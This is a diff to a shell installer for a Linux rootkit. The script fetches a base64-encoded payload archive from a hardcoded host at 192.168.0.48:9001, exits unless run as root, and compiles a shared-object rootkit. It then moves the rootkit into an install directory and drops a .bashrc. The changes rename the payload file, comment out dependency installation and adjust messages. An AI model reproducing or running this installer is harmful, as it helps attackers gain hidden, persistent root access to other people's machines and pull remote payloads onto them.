@@ -1,6 +1,6 @@
 #!/bin/sh
 
-[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/imgay.b64" # changeme
+[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/super.b64" # changeme
 WORKDIR="/tmp" # & mayb this.
 
 [ `id -u` != 0 ] && { echo "not root..."; exit; }
@@ -97,7 +97,7 @@ GID_PATH="`sed '10q;d' $INCLUDE_DIR/settings.cfg`"
 GIDTIME_PATH="`sed '11q;d' $INCLUDE_DIR/settings.cfg`"
 printf "done getting config values\n"
 
-install_deps
+#install_deps
 
 echo "compiling rootkit"
 LINKER_FLAGS="-ldl -lcrypt"
@@ -118,7 +118,7 @@ echo "installing"
 mv $INCLUDE_DIR/$BDVLSO.$PLATFORM $INSTALL_DIR/
 [ -f $INCLUDE_DIR/$BDVLSO.i686 ] && mv $INCLUDE_DIR/$BDVLSO.i686 $INSTALL_DIR/
 
-printf "\nrootkit installed"
+printf "\nrootkit installed\n"
 echo "preparing stuff"
 
 mv $INCLUDE_DIR/.bashrc $INSTALL_DIR/
